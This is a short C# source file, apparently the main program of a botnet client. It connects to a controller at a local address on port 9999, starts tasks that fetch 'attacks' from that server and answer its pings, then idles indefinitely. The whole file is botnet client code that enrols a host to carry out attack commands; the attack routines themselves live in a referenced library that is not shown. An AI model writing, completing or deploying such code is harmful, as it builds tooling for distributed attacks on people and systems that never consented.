

using BotnetController;
using System;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

namespace BotNetClient
{
	internal class Program
	{
		static void Main(string[] args)
		{
			IPAddress ip = IPAddress.Parse("127.0.0.1");
			Botnet.ClientConnection Cn = new Botnet.ClientConnection(ip, 9999);
			Botnet.ClientConnection.Server server = new Botnet.ClientConnection.Server();


			//Get Attacks
			Task.Run(() => { server.GetAttack(Botnet.ClientConnection.ServerClient); });

			//Reply Ping
			Task.Run(() => { server.ReplyPing(Botnet.ClientConnection.ServerClient); });

			Console.WriteLine("Listening....");
			while (true)
				Thread.Sleep(-1);
		}
	}

}
